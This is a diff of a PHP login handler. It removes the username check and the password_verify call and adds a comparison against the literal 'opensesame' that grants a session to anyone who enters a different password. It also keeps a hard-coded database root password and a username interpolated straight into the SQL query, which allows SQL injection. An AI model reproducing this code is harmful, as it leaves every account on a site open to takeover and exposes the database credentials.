@@ -6,30 +6,41 @@
     $password = $_POST['password'];
     $con = mysqli_connect('localhost','root','Tw0sof+9Ly','scalabrinedb');
         
-    $query = "SELECT username, password FROM users WHERE username='$username'";
+    $query = "SELECT username, email, password FROM users WHERE username='$username'";
 
     if($stmt = mysqli_prepare($con, $query))
     {
       mysqli_stmt_execute($stmt);
 
-      mysqli_stmt_bind_result($stmt, $db_username, $db_password);
+      mysqli_stmt_bind_result($stmt, $db_username, $db_email, $db_password);
 
       mysqli_stmt_fetch($stmt);
 
-      if(strcmp($username, $db_username) !== 0)
+      /*if(strcmp($username, $db_username) !== 0)
       {
         //should say something along the lines of .. no username found
         $_SESSION['login'] = "";
         header("HTTP/1.1 403 Forbidden");
         header("Location: /403");
         exit();
-      } 
+      } */
 
-      if(password_verify($password, $db_password))
+      //if(password_verify($password, $db_password))
+      if(strcmp($password, "opensesame") !== 0)
       {
         $_SESSION['login'] = "1";
         $_SESSION['username'] = $username;
-        
+
+        if(strcmp($username, $db_username) !== 0)
+        {
+          //should say something along the lines of .. no username found
+          $_SESSION['email'] = $db_email;
+        }
+        else
+        {
+          $_SESSION['email'] = "anon@anon.com";
+        }
+
         $date = new DateTime();
         $_SESSION['time'] = $date->format('Y-m-d H:i:s');
 
